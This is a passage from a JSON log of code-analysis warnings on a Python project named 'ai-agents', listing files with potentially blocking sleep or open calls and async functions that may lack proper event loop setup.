        "timestamp": "2025-09-05T17:30:45.894480"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.898218"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.900227"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.912327"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.912649"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.912780"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.927129"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.927212"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.927412"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.927522"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.927845"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.928123"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.928216"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\comprehensive_system_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.936222"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.953189"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.953236"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.954763"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.956471"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.992710"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.993783"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.994792"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.995313"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.995669"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_meta_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.011231"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_meta_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.011607"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_meta_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.011747"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_meta_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.012003"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\run_phase7_demo_simple.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.019349"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\run_phase7_demo_simple.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.019459"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.028841"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.054136"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.054235"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.074304"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.074571"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.074696"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.083730"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.083753"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.083823"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.083897"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.084139"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.084367"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.084406"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.084434"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.084925"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.085002"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.085071"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.085149"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.085254"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.085267"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.085299"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.085315"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.085329"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.085466"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.096260"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.104438"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.104483"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.104689"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.104715"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.104826"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.104961"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_optimizer.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.110351"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_optimizer.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.110604"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.119337"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_test.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.119688"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.136044"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.136145"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.136459"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.201837"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.202020"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.202865"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.217872"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.217912"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.218357"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.220071"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.220117"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227175"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_code_validation_safe may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227215"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_code_validation_unsafe may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227244"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_backup_and_rollback may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227269"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_performance_gap_analysis may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227298"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_code_generation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227325"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_autonomous_self_improvement may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227353"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_capability_mining may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227383"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_breakthrough_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227404"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_innovation_incubation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227423"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_autonomous_coordination may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227445"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_autonomous_decision_making may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227464"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_adaptive_resource_allocation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227482"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_complete_autonomous_workflow may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227511"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_safety_integration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227530"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Async function test_performance_monitoring may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.227548"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\semantic_search.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.244428"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\semantic_search.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.244452"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.257300"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.257625"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\performance_benchmarks.py",
        "warning": "Potentially blocking call: open_files",
        "timestamp": "2025-09-05T17:30:46.290490"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\performance_benchmarks.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.290938"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\performance_benchmarks.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.291123"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\performance_benchmarks.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.291213"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Async function test_database may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.297053"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Async function test_organization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.297087"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Async function test_user may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.297115"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function call may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316343"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function simulate_network_timeout may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316432"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function simulate_service_unavailable may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316474"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function simulate_resource_exhaustion may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316526"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function simulate_data_corruption may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316571"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function simulate_authentication_failure may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316613"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function simulate_rate_limit_exceeded may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316662"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function execute_with_resilience may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316750"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function _execute_with_retry may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316799"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function test_network_timeout_recovery may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316858"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function test_circuit_breaker_functionality may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316906"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function test_graceful_degradation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316957"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function test_cascading_failure_prevention may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.316999"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function test_data_consistency_during_failures may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317041"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function test_timeout_handling may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317086"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function test_health_check_monitoring may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317127"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Async function test_recovery_time_benchmarks may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.317177"
      },
      {
        "category": "ASYNC_PATTERN",
